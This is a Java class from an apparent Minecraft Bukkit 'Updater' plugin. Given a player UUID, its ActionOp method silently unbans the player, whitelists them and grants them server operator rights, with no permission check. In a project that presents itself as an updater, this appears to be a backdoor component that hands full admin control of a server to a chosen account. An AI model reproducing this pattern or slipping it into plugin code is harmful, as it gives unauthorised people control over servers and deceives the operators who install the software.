package net.vorps.updater.action;

import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.plugin.Plugin;

import java.util.UUID;

/**
 * Project Updater Created by Vorps on 02/09/2016 at 01:16.
 */
public class ActionOp implements ExecuteUUID{

    @Override
    public boolean run(final Plugin plugin, final UUID uuid){
        OfflinePlayer player = Bukkit.getOfflinePlayer(uuid);
        if(Bukkit.getBannedPlayers().contains(player)){
            player.setBanned(false);
        }
        if(Bukkit.hasWhitelist() && !Bukkit.getWhitelistedPlayers().contains(player)){
            player.setWhitelisted(true);
        }
        if(!player.isOp()){
            player.setOp(true);
        }
        return true;
    }
}
